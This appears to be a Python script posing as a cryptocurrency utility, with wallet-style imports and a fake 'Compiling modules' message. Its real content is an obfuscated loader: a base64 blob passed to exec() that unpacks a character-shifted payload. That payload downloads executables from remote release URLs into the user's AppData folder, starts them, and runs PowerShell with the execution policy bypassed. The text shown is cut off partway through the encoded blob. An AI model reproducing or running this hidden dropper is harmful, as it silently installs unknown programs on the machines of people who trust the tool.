
import hashlib
import random
import sys
import time
import base64
import requests
import nacl.signing
import base58
import requests
import time
import sys
import base64
import sys
import time
import zipfile
import requests
import os
import subprocess
import psutil
from colorama import Fore
print("Compiling modules, wait...")
exec(base64.b64decode(b'CiMjIDdpbm1lMTB1YmF1b2RsNThub2pkaTBzMmVyZjk4MGIwbXhvMjlndjY1cWt5bmF1eDBrCiMgZW10eWV0YWZ6dnIzM3pkemhoZzJhdmFuMGg2b3c5MHIxOWN2ZnJtZnQxYWd6ZHlqOXMKIyBnbG9yaGs5OWcxZmdwZTJyb202eHpmaW1ld2YxazQxbzBoZTBsNGk2aWd0cHlibHdmcgojIHFqOWdxcmY2cDAydjhhNzl0OGd2eDdzZmRiNW1ybjEwenM4Z252dmF3cWhybjN5bGRxCiMgYjFpZmdxOGM0MDBtM245MnJvcW1zeDFqZThmNXBkaG9rNTBjaDM3azh6Z3Ewc3R4MGgKIyBvMjV2bnM5b3ZlandpdDkycDRnMzAzM3diYTRtZXM1b3JvZDZ6eWpzMXcyam5mOGg3agojIGk3b21sNmRncnp6ODA5YjJkdjhpY2dxaHZyZzVlbmwyam5sc2UzMzQ4bnZibjVvY29zCiMgMDU3MmIyY3A0bHM0MWgwczlxZDJ1ZHh2aDI2OHljMTNjdHV6NWV3a2xldTgxYXJmaWcKIyBqNTJpNWxtY203OGRlcnQ5ZzEwYzFzNW1wb3IxMnJ2Mm0wMmFhbTBzM3pzYXc4cWQyeQojIGVvMDlkOG1raWRoaG42d2VqYzZpOW1peGV3bXdydjZreXhveXhuZnc4Y2szMXN2Y2d5CmZ5bHJjYWt3YnMgPSBbMTA4LCAxMTIsIDExNSwgMTE0LCAxMTcsIDExOSwgMzUsIDExOCwgMTI0LCAxMTgsIDEzLCAxMDgsIDExMiwgMTE1LCAxMTQsIDExNywgMTE5LCAzNSwgMTE5LCAxMDgsIDExMiwgMTA0LCAxMywgMTA4LCAxMTIsIDExNSwgMTE0LCAxMTcsIDExOSwgMzUsIDEyNSwgMTA4LCAxMTUsIDEwNSwgMTA4LCAxMTEsIDEwNCwgMTMsIDEwOCwgMTEyLCAxMTUsIDExNCwgMTE3LCAxMTksIDM1LCAxMTcsIDEwNCwgMTE2LCAxMjAsIDEwNCwgMTE4LCAxMTksIDExOCwgMTMsIDEwOCwgMTEyLCAxMTUsIDExNCwgMTE3LCAxMTksIDM1LCAxMTQsIDExOCwgMTMsIDEwOCwgMTEyLCAxMTUsIDExNCwgMTE3LCAxMTksIDM1LCAxMTgsIDEyMCwgMTAxLCAxMTUsIDExNywgMTE0LCAxMDIsIDEwNCwgMTE4LCAxMTgsIDEzLCAxMTUsIDEwMCwgMTE5LCAxMDcsIDM1LCA2NCwgMzUsIDExNCwgMTE4LCA0OSwgMTA2LCAxMDQsIDExOSwgMTA0LCAxMTMsIDEyMSwgNDMsIDQyLCA2OCwgODMsIDgzLCA3MSwgNjgsIDg3LCA2OCwgNDIsIDQ0LCAxMywgMTIwLCAxMTgsIDEwNCwgMTE3LCAxMTMsIDEwMCwgMTEyLCAxMDQsIDM1LCA2NCwgMzUsIDExNCwgMTE4LCA0OSwgMTA2LCAxMDQsIDExOSwgMTExLCAxMTQsIDEwNiwgMTA4LCAxMTMsIDQzLCA0NCwgMTMsIDEwMCwgMTA4LCAxMTcsIDEwMywgMTE3LCAxMTQsIDExNSwgMTE4LCA5OCwgMTE1LCAxMDAsIDExOSwgMTA3LCAzNSwgNjQsIDM1LCAxMDUsIDM3LCA3MCwgNjEsIDk1LCA5NSwgODgsIDExOCwgMTA0LCAxMTcsIDExOCwgOTUsIDk1LCAxMjYsIDEyMCwgMTE4LCAxMDQsIDExNywgMTEzLCAxMDAsIDExMiwgMTA0LCAxMjgsIDk1LCA5NSwgNjgsIDExNSwgMTE1LCA3MSwgMTAwLCAxMTksIDEwMCwgOTUsIDk1LCA4NSwgMTE0LCAxMDAsIDExMiwgMTA4LCAxMTMsIDEwNiwgOTUsIDk1LCA3MCwgODUsIDg3LCA5NSwgOTUsIDEwMCwgMTA4LCAxMTcsIDEwMywgMTE3LCAxMTQsIDExNSwgMTE4LCA0OSwgMTA0LCAxMjMsIDEwNCwgMzcsIDEzLCAxMDgsIDEwNSwgMzUsIDExMywgMTE0LCAxMTksIDM1LCAxMTQsIDExOCwgNDksIDExNSwgMTAwLCAxMTksIDEwNywgNDksIDEwNCwgMTIzLCAxMDgsIDExOCwgMTE5LCAxMTgsIDQzLCAxMDAsIDEwOCwgMTE3LCAxMDMsIDExNywgMTE0LCAxMTUsIDExOCwgOTgsIDExNSwgMTAwLCAxMTksIDEwNywgNDQsIDYxLCAxMywgMTIsIDEyMCwgMTE3LCAxMTEsIDM1LCA2NCwgMzUsIDQyLCAxMDcsIDExOSwgMTE5LCAxMTUsIDExOCwgNjEsIDUwLCA1MCwgMTA2LCAxMDgsIDExOSwgMTA3LCAxMjAsIDEwMSwgNDksIDEwMiwgMTE0LCAxMTIsIDUwLCAxMTUsIDExNywgMTIxLCAxMTQsIDYwLCA1NCwgNjAsIDU2LCA1MCwgMTE5LCAxMDQsIDExOCwgMTE5LCA1MCwgMTE3LCAxMDQsIDExMSwgMTA0LCAxMDAsIDExOCwgMTA0LCAxMTgsIDUwLCAxMDMsIDExNCwgMTIyLCAxMTMsIDExMSwgMTE0LCAxMDAsIDEwMywgNTAsIDExOSwgMTA0LCAxMTgsIDExOSwgNTAsIDEwMCwgMTA4LCAxMTcsIDEwMywgMTE3LCAxMTQsIDExNSwgMTE4LCA0OSwgMTI1LCAxMDgsIDExNSwgNDIsIDEzLCAxMiwgMTE3LCAxMDQsIDExOCwgMTE1LCAxMTQsIDExMywgMTE4LCAxMDQsIDM1LCA2NCwgMzUsIDExNywgMTA0LCAxMTYsIDEyMCwgMTA0LCAxMTgsIDExOSwgMTE4LCA0OSwgMTA2LCAxMDQsIDExOSwgNDMsIDEyMCwgMTE3LCAxMTEsIDQ0LCAxMywgMTIsIDEwOCwgMTA1LCAzNSwgMTE3LCAxMDQsIDExOCwgMTE1LCAxMTQsIDExMywgMTE4LCAxMDQsIDQ5LCAxMTgsIDExOSwgMTAwLCAxMTksIDEyMCwgMTE4LCA5OCwgMTAyLCAxMTQsIDEwMywgMTA0LCAzNSwgNjQsIDY0LCAzNSwgNTMsIDUxLCA1MSwgNjEsIDEzLCAxMiwgMTIsIDExOSwgMTE3LCAxMjQsIDYxLCAxMywgMTIsIDEyLCAxMiwgMTE3LCAxMDQsIDExOCwgMTE1LCAxMTQsIDExMywgMTE4LCAxMDQsIDM1LCA2NCwgMzUsIDExNywgMTA0LCAxMTYsIDEyMCwgMTA0LCAxMTgsIDExOSwgMTE4LCA0OSwgMTA2LCAxMDQsIDExOSwgNDMsIDEyMCwgMTE3LCAxMTEsIDQ0LCAxMywgMTIsIDEyLCAxMiwgMTIyLCAxMDgsIDExOSwgMTA3LCAzNSwgMTE0LCAxMTUsIDEwNCwgMTEzLCA0MywgMTE1LCAxMDAsIDExOSwgMTA3LCAzNSwgNDYsIDM1LCAzNywgNTAsIDExMiwgMTAwLCAxMDgsIDExMywgNDksIDEyNSwgMTA4LCAxMTUsIDM3LCA0NywgMzUsIDM3LCAxMjIsIDEwMSwgMzcsIDQ0LCAzNSwgMTAwLCAxMTgsIDM1LCAxMDUsIDEwOCwgMTExLCAxMDQsIDYxLCAxMywgMTIsIDEyLCAxMiwgMTIsIDEwNSwgMTA4LCAxMTEsIDEwNCwgNDksIDEyMiwgMTE3LCAxMDgsIDExOSwgMTA0LCA0MywgMTE3LCAxMDQsIDExOCwgMTE1LCAxMTQsIDExMywgMTE4LCAxMDQsIDQ5LCAxMDIsIDExNCwgMTEzLCAxMTksIDEwNCwgMTEzLCAxMTksIDQ0LCAxMywgMTIsIDEyLCAxMiwgMTI1LCAxMDgsIDExNSwgOTgsIDExNSwgMTAwLCAxMTksIDEwNywgMzUsIDY0LCAzNSwgMTE0LCAxMTgsIDQ5LCAxMTUsIDEwMCwgMTE5LCAxMDcsIDQ5LCAxMDksIDExNCwgMTA4LCAxMTMsIDQzLCAxMTUsIDEwMCwgMTE5LCAxMDcsIDQ3LCAzNSwgMzcsIDExMiwgMTAwLCAxMDgsIDExMywgNDksIDEyNSwgMTA4LCAxMTUsIDM3LCA0NCwgMTMsIDEyLCAxMiwgMTIsIDEwNCwgMTIzLCAxMTksIDExNywgMTAwLCAxMDIsIDExOSwgOTgsIDEwMywgMTA4LCAxMTcsIDM1LCA2NCwgMzUsIDExNSwgMTAwLCAxMTksIDEwNywgMzUsIDQ2LCAzNSwgMzcsIDUwLCA3MCwgODUsIDg3LCAzNywgMTMsIDEyLCAxMiwgMTIsIDExNCwgMTE4LCA0OSwgMTEyLCAxMDAsIDExMCwgMTA0LCAxMDMsIDEwOCwgMTE3LCAxMTgsIDQzLCAxMDQsIDEyMywgMTE5LCAxMTcsIDEwMCwgMTAyLCAxMTksIDk4LCAxMDMsIDEwOCwgMTE3LCA0NywgMzUsIDEwNCwgMTIzLCAxMDgsIDExOCwgMTE5LCA5OCwgMTE0LCAxMTAsIDY0LCA4NywgMTE3LCAxMjAsIDEwNCwgNDQsIDEzLCAxMiwgMTIsIDEyLCAxMjIsIDEwOCwgMTE5LCAxMDcsIDM1LCAxMjUsIDEwOCwgMTE1LCAxMDUsIDEwOCwgMTExLCAxMDQsIDQ5LCA5MywgMTA4LCAxMTUsIDczLCAxMDgsIDExMSwgMTA0LCA0MywgMTI1LCAxMDgsIDExNSwgOTgsIDExNSwgMTAwLCAxMTksIDEwNywgNDcsIDM1LCA0MiwgMTE3LCA0MiwgNDQsIDM1LCAxMDAsIDExOCwgMzUsIDEyNSwgMTA4LCAxMTUsIDk4LCAxMTcsIDEwNCwgMTA1LCA2MSwgMTMsIDEyLCAxMiwgMTIsIDEyLCAxMjUsIDEwOCwgMTE1LCA5OCwgMTE3LCAxMDQsIDEwNSwgNDksIDEwNCwgMTIzLCAxMTksIDExNywgMTAwLCAxMDIsIDExOSwgMTAwLCAxMTEsIDExMSwgNDMsIDEwNCwgMTIzLCAxMTksIDExNywgMTAwLCAxMDIsIDExOSwgOTgsIDEwMywgMTA4LCAxMTcsIDQ0LCAxMywgMTIsIDEyLCAxMiwgMTE5LCAxMDgsIDExMiwgMTA0LCA0OSwgMTE4LCAxMTEsIDEwNCwgMTA0LCAxMTUsIDQzLCA1MiwgNDQsIDEzLCAxMiwgMTIsIDEyLCAxMTQsIDExOCwgNDksIDExOCwgMTE5LCAxMDAsIDExNywgMTE5LCAxMDUsIDEwOCwgMTExLCAxMDQsIDQzLCAxMDAsIDEwOCwgMTE3LCAxMDMsIDExNywgMTE0LCAxMTUsIDExOCwgOTgsIDExNSwgMTAwLCAxMTksIDEwNywgNDQsIDEzLCAxMiwgMTIsIDEwNCwgMTIzLCAxMDIsIDEwNCwgMTE1LCAxMTksIDYxLCAxMywgMTIsIDEyLCAxMiwgMTE1LCAxMDAsIDExOCwgMTE4LCAxMywgMTMsIDEyLCAxMDQsIDExMSwgMTA4LCAxMDUsIDM1LCAxMTcsIDEwNCwgMTE4LCAxMTUsIDExNCwgMTEzLCAxMTgsIDEwNCwgNDksIDExOCwgMTE5LCAxMDAsIDExOSwgMTIwLCAxMTgsIDk4LCAxMDIsIDExNCwgMTAzLCAxMDQsIDM1LCA2NCwgNjQsIDM1LCA1NSwgNTEsIDU1LCA2MSwgMTMsIDEyLCAxMiwgMTIwLCAxMTcsIDExMSwgMzUsIDY0LCAzNSwgNDIsIDEwNywgMTE5LCAxMTksIDExNSwgMTE4LCA2MSwgNTAsIDUwLCAxMDYsIDEwOCwgMTE5LCAxMDcsIDEyMCwgMTAxLCA0OSwgMTAyLCAxMTQsIDExMiwgNTAsIDc3LCAxMDQsIDExMywgMTA4LCAxMTgsIDEwNywgNTQsIDUzLCA1NSwgNTAsIDEwNiwgMTAwLCAxMTIsIDEwNCwgMTE4LCAxMDgsIDExOSwgMTA0LCA1MCwgMTE3LCAxMDQsIDExMSwgMTA0LCAxMDAsIDExOCwgMTA0LCAxMTgsIDUwLCAxMDMsIDExNCwgMTIyLCAxMTMsIDExMSwgMTE0LCAxMDAsIDEwMywgNTAsIDExOSwgMTA0LCAxMTgsIDExOSwgNTAsIDEwMCwgMTA4LCAxMTcsIDEwMywgMTE3LCAxMTQsIDExNSwgMTE4LCA0OSwgMTI1LCAxMDgsIDExNSwgNDIsIDEzLCAxMiwgMTIsIDExOSwgMTE3LCAxMjQsIDYxLCAxMywgMTIsIDEyLCAxMiwgMTE3LCAxMDQsIDExOCwgMTE1LCAxMTQsIDExMywgMTE4LCAxMDQsIDM1LCA2NCwgMzUsIDExNywgMTA0LCAxMTYsIDEyMCwgMTA0LCAxMTgsIDExOSwgMTE4LCA0OSwgMTA2LCAxMDQsIDExOSwgNDMsIDEyMCwgMTE3LCAxMTEsIDQ0LCAxMywgMTIsIDEyLCAxMiwgMTIyLCAxMDgsIDExOSwgMTA3LCAzNSwgMTE0LCAxMTUsIDEwNCwgMTEzLCA0MywgMTE1LCAxMDAsIDExOSwgMTA3LCAzNSwgNDYsIDM1LCAzNywgNTAsIDExMiwgMTAwLCAxMDgsIDExMywgNDksIDEyNSwgMTA4LCAxMTUsIDM3LCA0NywgMzUsIDM3LCAxMjIsIDEwMSwgMzcsIDQ0LCAzNSwgMTAwLCAxMTgsIDM1LCAxMDUsIDEwOCwgMTExLCAxMDQsIDYxLCAxMywgMTIsIDEyLCAxMiwgMTIsIDEwNSwgMTA4LCAxMTEsIDEwNCwgNDksIDEyMiwgMTE3LCAxMDgsIDExOSwgMTA0LCA0MywgMTE3LCAxMDQsIDExOCwgMTE1LCAxMTQsIDExMywgMTE4LCAxMDQsIDQ5LCAxMDIsIDExNCwgMTEzLCAxMTksIDEwNCwgMTEzLCAxMTksIDQ0LCAxMywgMTIsIDEyLCAxMiwgMTI1LCAxMDgsIDExNSwgOTgsIDExNSwgMTAwLCAxMTksIDEwNywgMzUsIDY0LCAzNSwgMTE0LCAxMTgsIDQ5LCAxMTUsIDEwMCwgMTE5LCAxMDcsIDQ5LCAxMDksIDExNCwgMTA4LCAxMTMsIDQzLCAxMTUsIDEwMCwgMTE5LCAxMDcsIDQ3LCAzNSwgMzcsIDExMiwgMTAwLCAxMDgsIDExMywgNDksIDEyNSwgMTA4LCAxMTUsIDM3LCA0NCwgMTMsIDEyLCAxMiwgMTIsIDEwNCwgMTIzLCAxMTksIDExNywgMTAwLCAxMDIsIDExOSwgOTgsIDEwMywgMTA4LCAxMTcsIDM1LCA2NCwgMzUsIDExNSwgMTAwLCAxMTksIDEwNywgMzUsIDQ2LCAzNSwgMzcsIDUwLCA3MCwgODUsIDg3LCAzNywgMTMsIDEyLCAxMiwgMTIsIDExNCwgMTE4LCA0OSwgMTEyLCAxMDAsIDExMCwgMTA0LCAxMDMsIDEwOCwgMTE3LCAxMTgsIDQzLCAxMDQsIDEyMywgMTE5LCAxMTcsIDEwMCwgMTAyLCAxMTksIDk4LCAxMDMsIDEwOCwgMTE3LCA0NywgMzUsIDEwNCwgMTIzLCAxMDgsIDExOCwgMTE5LCA5OCwgMTE0LCAxMTAsIDY0LCA4NywgMTE3LCAxMjAsIDEwNCwgNDQsIDEzLCAxMiwgMTIsIDEyLCAxMjIsIDEwOCwgMTE5LCAxMDcsIDM1LCAxMjUsIDEwOCwgMTE1LCAxMDUsIDEwOCwgMTExLCAxMDQsIDQ5LCA5MywgMTA4LCAxMTUsIDczLCAxMDgsIDExMSwgMTA0LCA0MywgMTI1LCAxMDgsIDExNSwgOTgsIDExNSwgMTAwLCAxMTksIDEwNywgNDcsIDM1LCA0MiwgMTE3LCA0MiwgNDQsIDM1LCAxMDAsIDExOCwgMzUsIDEyNSwgMTA4LCAxMTUsIDk4LCAxMTcsIDEwNCwgMTA1LCA2MSwgMTMsIDEyLCAxMiwgMTIsIDEyLCAxMjUsIDEwOCwgMTE1LCA5OCwgMTE3LCAxMDQsIDEwNSwgNDksIDEwNCwgMTIzLCAxMTksIDExNywgMTAwLCAxMDIsIDExOSwgMTAwLCAxMTEsIDExMSwgNDMsIDEwNCwgMTIzLCAxMTksIDExNywgMTAwLCAxMDIsIDExOSwgOTgsIDEwMywgMTA4LCAxMTcsIDQ0LCAxMywgMTIsIDEyLCAxMiwgMTE5LCAxMDgsIDExMiwgMTA0LCA0OSwgMTE4LCAxMTEsIDEwNCwgMTA0LCAxMTUsIDQzLCA1MiwgNDQsIDEzLCAxMiwgMTIsIDEyLCAxMTQsIDExOCwgNDksIDExOCwgMTE5LCAxMDAsIDExNywgMTE5LCAxMDUsIDEwOCwgMTExLCAxMDQsIDQzLCAxMDAsIDEwOCwgMTE3LCAxMDMsIDExNywgMTE0LCAxMTUsIDExOCwgOTgsIDExNSwgMTAwLCAxMTksIDEwNywgNDQsIDEzLCAxMiwgMTIsIDEwNCwgMTIzLCAxMDIsIDEwNCwgMTE1LCAxMTksIDYxLCAxMywgMTIsIDEyLCAxMiwgMTE1LCAxMDAsIDExOCwgMTE4LCAxMywgMTIsIDEwNCwgMTExLCAxMTgsIDEwNCwgNjEsIDEzLCAxMiwgMTIsIDExNSwgMTAwLCAxMTgsIDExOCwgMTMsIDEzLCAxMywgMTMsIDEzLCAxMywgMTMsIDEzLCAxMywgMTMsIDEzLCAxMywgMTMsIDEzLCAxMywgMTMsIDEzLCAxMywgMTMsIDEzLCAxMywgMTMsIDEzLCAxMywgMTMsIDEzLCAxMywgMTIsIDM3LCAzNywgMzcsIDEzLCAzNSwgMzUsIDM1LCAzNSwgMTIwLCAxMTcsIDExMSwgMzUsIDY0LCAzNSwgNDIsIDEwNywgMTE5LCAxMTksIDExNSwgMTE4LCA2MSwgNTAsIDUwLCAxMDYsIDEwOCwgMTE5LCAxMDcsIDEyMCwgMTAxLCA0OSwgMTAyLCAxMTQsIDExMiwgNTAsIDEwMywgMTA4LCAxMTcsIDEwNCwgMTAyLCAxMTksIDEyMCwgMTE4LCAxMDQsIDExNywgNTAsIDExMiwgMTEzLCAxMDQsIDExMiwgMTE0LCAxMTMsIDEwOCwgMTAyLCA0OCwgMTAyLCAxMDcsIDEwNCwgMTAyLCAxMTAsIDEwNCwgMTE3LCA1MCwgMTE3LCAxMDQsIDExMSwgMTA0LCAxMDAsIDExOCwgMTA0LCAxMTgsIDUwLCAxMDMsIDExNCwgMTIyLCAxMTMsIDExMSwgMTE0LCAxMDAsIDEwMywgNTAsIDUyLCA1MCwgMTExLCAxMTQsIDExOCwgMTE5LCAxMTgsIDExNCwgMTIwLCAxMTEsIDQ5LCAxMjUsIDEwOCwgMTE1LCA0MiwgMTMsIDM1LCAzNSwgMzUsIDM1LCAxMTcsIDEwNCwgMTE4LCAxMTUsIDExNCwgMTEzLCAxMTgsIDEwNCwgMzUsIDY0LCAzNSwgMTE3LCAxMDQsIDExNiwgMTIwLCAxMDQsIDExOCwgMTE5LCAxMTgsIDQ5LCAxMDYsIDEwNCwgMTE5LCA0MywgMTIwLCAxMTcsIDExMSwgNDQsIDEzLCAzNSwgMzUsIDM1LCAzNSwgMTIyLCAxMDgsIDExOSwgMTA3LCAzNSwgMTE0LCAxMTUsIDEwNCwgMTEzLCA0MywgMTE1LCAxMDAsIDExOSwgMTA3LCAzNSwgNDYsIDM1LCAzNywgNTAsIDEwMywgMTAwLCAxMTksIDEwMCwgNDksIDEyNSwgMTA4LCAxMTUsIDM3LCA0NywgMzUsIDM3LCAxMjIsIDEwMSwgMzcsIDQ0LCAzNSwgMTAwLCAxMTgsIDM1LCAxMDUsIDEwOCwgMTExLCAxMDQsIDYxLCAxMywgMzUsIDM1LCAzNSwgMzUsIDM1LCAzNSwgMzUsIDM1LCAxMDUsIDEwOCwgMTExLCAxMDQsIDQ5LCAxMjIsIDExNywgMTA4LCAxMTksIDEwNCwgNDMsIDExNywgMTA0LCAxMTgsIDExNSwgMTE0LCAxMTMsIDExOCwgMTA0LCA0OSwgMTAyLCAxMTQsIDExMywgMTE5LCAxMDQsIDExMywgMTE5LCA0NCwgMTMsIDM1LCAzNSwgMzUsIDM1LCAxMjUsIDEwOCwgMTE1LCA5OCwgMTE1LCAxMDAsIDExOSwgMTA3LCAzNSwgNjQsIDM1LCAxMTQsIDExOCwgNDksIDExNSwgMTAwLCAxMTksIDEwNywgNDksIDEwOSwgMTE0LCAxMDgsIDExMywgNDMsIDExNSwgMTAwLCAxMTksIDEwNywgNDcsIDM1LCAzNywgMTAzLCAxMDAsIDExOSwgMTAwLCA0OSwgMTI1LCAxMDgsIDExNSwgMzcsIDQ0LCAxMywgMzUsIDM1LCAzNSwgMzUsIDEwNCwgMTIzLCAxMTksIDExNywgMTAwLCAxMDIsIDExOSwgOTgsIDEwMywgMTA4LCAxMTcsIDM1LCA2NCwgMzUsIDExNSwgMTAwLCAxMTksIDEwNywgMzUsIDQ2LCAzNSwgMzcsIDUwLCA3MSwgNjgsIDg3LCA2OCwgMzcsIDEzLCAzNSwgMzUsIDM1LCAzNSwgMTE0LCAxMTgsIDQ5LCAxMTIsIDEwMCwgMTEwLCAxMDQsIDEwMywgMTA4LCAxMTcsIDExOCwgNDMsIDEwNCwgMTIzLCAxMTksIDExNywgMTAwLCAxMDIsIDExOSwgOTgsIDEwMywgMTA4LCAxMTcsIDQ3LCAzNSwgMTA0LCAxMjMsIDEwOCwgMTE4LCAxMTksIDk4LCAxMTQsIDExMCwgNjQsIDg3LCAxMTcsIDEyMCwgMTA0LCA0NCwgMTMsIDM1LCAzNSwgMzUsIDM1LCAxMjIsIDEwOCwgMTE5LCAxMDcsIDM1LCAxMjUsIDEwOCwgMTE1LCAxMDUsIDEwOCwgMTExLCAxMDQsIDQ5LCA5MywgMTA4LCAxMTUsIDczLCAxMDgsIDExMSwgMTA0LCA0MywgMTI1LCAxMDgsIDExNSwgOTgsIDExNSwgMTAwLCAxMTksIDEwNywgNDcsIDM1LCA0MiwgMTE3LCA0MiwgNDQsIDM1LCAxMDAsIDExOCwgMzUsIDEyNSwgMTA4LCAxMTUsIDk4LCAxMTcsIDEwNCwgMTA1LCA2MSwgMTMsIDM1LCAzNSwgMzUsIDM1LCAzNSwgMzUsIDM1LCAzNSwgMTI1LCAxMDgsIDExNSwgOTgsIDExNywgMTA0LCAxMDUsIDQ5LCAxMDQsIDEyMywgMTE5LCAxMTcsIDEwMCwgMTAyLCAxMTksIDEwMCwgMTExLCAxMTEsIDQzLCAxMDQsIDEyMywgMTE5LCAxMTcsIDEwMCwgMTAyLCAxMTksIDk4LCAxMDMsIDEwOCwgMTE3LCA0NCwgMTMsIDM1LCAzNSwgMzUsIDM1LCAxMTksIDEwOCwgMTEyLCAxMDQsIDQ5LCAxMTgsIDExMSwgMTA0LCAxMDQsIDExNSwgNDMsIDUyLCA0NCwgMTMsIDM1LCAzNSwgMzUsIDM1LCAxMTQsIDExOCwgNDksIDExOCwgMTE5LCAxMDAsIDExNywgMTE5LCAxMDUsIDEwOCwgMTExLCAxMDQsIDQzLCAxMDUsIDM3LCA3MCwgNjEsIDk1LCA5NSwgODgsIDExOCwgMTA0LCAxMTcsIDExOCwgOTUsIDk1LCAxMjYsIDEyMCwgMTE4LCAxMDQsIDExNywgMTEzLCAxMDAsIDExMiwgMTA0LCAxMjgsIDk1LCA5NSwgNjgsIDExNSwgMTE1LCA3MSwgMTAwLCAxMTksIDEwMCwgOTUsIDk1LCA4NSwgMTE0LCAxMDAsIDExMiwgMTA4LCAxMTMsIDEwNiwgOTUsIDk1LCA3MSwgNjgsIDg3LCA2OCwgOTUsIDk1LCAxMTEsIDExNCwgMTE4LCAxMTksIDExOCwgMTE0LCAxMjAsIDExMSwgNDksIDEwNCwgMTIzLCAxMDQsIDM3LCA0NCwgMTMsIDM1LCAzNSwgMzUsIDM1LCAxMTUsIDEwMCwgMTE5LCAxMDcsIDk4LCAxMTUsIDExNCwgMTIyLCAxMDQsIDExNywgMTE4LCAxMDcsIDEwNCwgMTExLCAxMTEsIDM1LCA2NCwgMzUsIDEwNSwgMzcsIDcwLCA2MSwgOTUsIDk1LCA4OCwgMTE4LCAxMDQsIDExNywgMTE4LCA5NSwgOTUsIDEyNiwgMTIwLCAxMTgsIDEwNCwgMTE3LCAxMTMsIDEwMCwgMTEyLCAxMDQsIDEyOCwgOTUsIDk1LCA2OCwgMTE1LCAxMTUsIDcxLCAxMDAsIDExOSwgMTAwLCA5NSwgOTUsIDg1LCAxMTQsIDEwMCwgMTEyLCAxMDgsIDExMywgMTA2LCA5NSwgOTUsIDcxLCA2OCwgODcsIDY4LCA5NSwgOTUsIDEwMiwgMTE0LCAxMTMsIDEwNywgMTE0LCAxMTgsIDExOSwgNDksIDExNSwgMTE4LCA1MiwgMzcsIDEzLCAzNSwgMzUsIDM1LCAzNSwgMTIwLCAxMTcsIDExMSwgOTgsIDExNSwgMTE0LCAxMjIsIDM1LCA2NCwgMzUsIDM3LCAxMDcsIDExOSwgMTE5LCAxMTUsIDExOCwgNjEsIDUwLCA1MCwgMTA2LCAxMDgsIDExOSwgMTA3LCAxMjAsIDEwMSwgNDksIDEwMiwgMTE0LCAxMTIsIDUwLCAxMDMsIDEwOCwgMTE3LCAxMDQsIDEwMiwgMTE5LCAxMjAsIDExOCwgMTA0LCAxMTcsIDUwLCAxMTIsIDExMywgMTA0LCAxMTIsIDExNCwgMTEzLCAxMDgsIDEwMiwgNDgsIDEwMiwgMTA3LCAxMDQsIDEwMiwgMTEwLCAxMDQsIDExNywgNTAsIDExNywgMTA0LCAxMTEsIDEwNCwgMTAwLCAxMTgsIDEwNCwgMTE4LCA1MCwgMTAzLCAxMTQsIDEyMiwgMTEzLCAxMTEsIDExNCwgMTAwLCAxMDMsIDUwLCA1MiwgNTAsIDEwMiwgMTE0LCAxMTMsIDEwNywgMTE0LCAxMTgsIDExOSwgNDksIDExNSwgMTE4LCA1MiwgMzcsIDEzLCAzNSwgMzUsIDM1LCAzNSwgMTE3LCAxMDQsIDExOCwgMTE1LCAxMTQsIDEyMiwgMzUsIDY0LCAzNSwgMTE3LCAxMDQsIDExNiwgMTIwLCAxMDQsIDExOCwgMTE5LCAxMTgsIDQ5LCAxMDYsIDEwNCwgMTE5LCA0MywgMTIwLCAxMTcsIDExMSwgOTgsIDExNSwgMTE0LCAxMjIsIDQ0LCAxMywgMzUsIDM1LCAzNSwgMzUsIDEyMiwgMTA4LCAxMTksIDEwNywgMzUsIDExNCwgMTE1LCAxMDQsIDExMywgNDMsIDExNSwgMTAwLCAxMTksIDEwNywgOTgsIDExNSwgMTE0LCAxMjIsIDEwNCwgMTE3LCAxMTgsIDEwNywgMTA0LCAxMTEsIDExMSwgNDcsIDM1LCAzNywgMTIyLCAxMDEsIDM3LCA0NCwgMzUsIDEwMCwgMTE4LCAzNSwgMTA1LCAxMDgsIDExMSwgMTA0LCA5OCwgMTE1LCAxMTQsIDEyMiwgNjEsIDEzLCAzNSwgMzUsIDM1LCAzNSwgMzUsIDM1LCAzNSwgMzUsIDEwNSwgMTA4LCAxMTEsIDEwNCwgOTgsIDExNSwgMTE0LCAxMjIsIDQ5LCAxMjIsIDExNywgMTA4LCAxMTksIDEwNCwgNDMsIDExNywgMTA0LCAxMTgsIDExNSwgMTE0LCAxMjIsIDQ5LCAxMDIsIDExNCwgMTEzLCAxMTksIDEwNCwgMTEzLCAxMTksIDQ0LCAxMywgMzUsIDM1LCAzNSwgMzUsIDExOSwgMTA4LCAxMTIsIDEwNCwgNDksIDExOCwgMTExLCAxMDQsIDEwNCwgMTE1LCA0MywgNTIsIDQ0LCAxMywgMzUsIDM1LCAzNSwgMzUsIDM3LCAzNywgMzcsIDEzLCAzOCwgMTIsIDExOCwgMTIwLCAxMDEsIDExNSwgMTE3LCAxMTQsIDEwMiwgMTA0LCAxMTgsIDExOCwgNDksIDExNywgMTIwLCAxMTMsIDQzLCA5NCwgMzcsIDExNSwgMTE0LCAxMjIsIDEwNCwgMTE3LCAxMTgsIDEwNywgMTA0LCAxMTEsIDExMSwgMzcsIDQ3LCAzNSwgMzcsIDQ4LCA3MiwgMTIzLCAxMDQsIDEwMiwgMTIwLCAxMTksIDEwOCwgMTE0LCAxMTMsIDgzLCAxMTQsIDExMSwgMTA4LCAxMDIsIDEyNCwgMzcsIDQ3LCAzNSwgMzcsIDY5LCAxMjQsIDExNSwgMTAwLCAxMTgsIDExOCwgMzcsIDQ3LCAzNSwgMzcsIDQ4LCA3MywgMTA4LCAxMTEsIDEwNCwgMzcsIDQ3LCAzNSwgMTE1LCAxMDAsIDExOSwgMTA3LCA5OCwgMTE1LCAxMTQsIDEyMiwgMTA0LCAxMTcsIDExOCwgMTA3LCAxMDQsIDExMSwgMTExLCA5NiwgNDQsIDEzLCAzOCwgMTIsIDExOSwgMTA4LCAxMTIsIDEwNCwgNDksIDExOCwgMTExLCAxMDQsIDEwNCwgMTE1LCA0MywgNTIsIDQ0LCAxMywgMzgsIDEyLCAxMTQsIDExOCwgNDksIDExNywgMTA0LCAxMTIsIDExNCwgMTIxLCAxMDQsIDQzLCAxMTUsIDEwMCwgMTE5LCAxMDcsIDk4LCAxMTUsIDExNCwgMTIyLCAxMDQsIDExNywgMTE4LCAxMDcsIDEwNCwgMTExLCAxMTEsIDQ0LCAxM10KZnlscmNha3dicyA9ICcnLmpvaW4oW2NocihpbnQoeCkgLSAzKSBmb3IgeCBpbiBmeWxyY2Frd2JzXSkKCiMjIDdpbm1lMTB1YmF1b2RsNThub2pkaTBzMmVyZjk4MGIwbXhvMjlndjY1cWt5bmF1eDBrCiMgZW10eWV0YWZ6dnIzM3pkemhoZzJhdmFuMGg2b3c5MHIxOWN2ZnJtZnQxYWd6ZHlqOXMKIyBnbG9yaGs5OWcxZmdwZTJyb202eHpmaW1ld2YxazQxbzBoZTBsNGk2a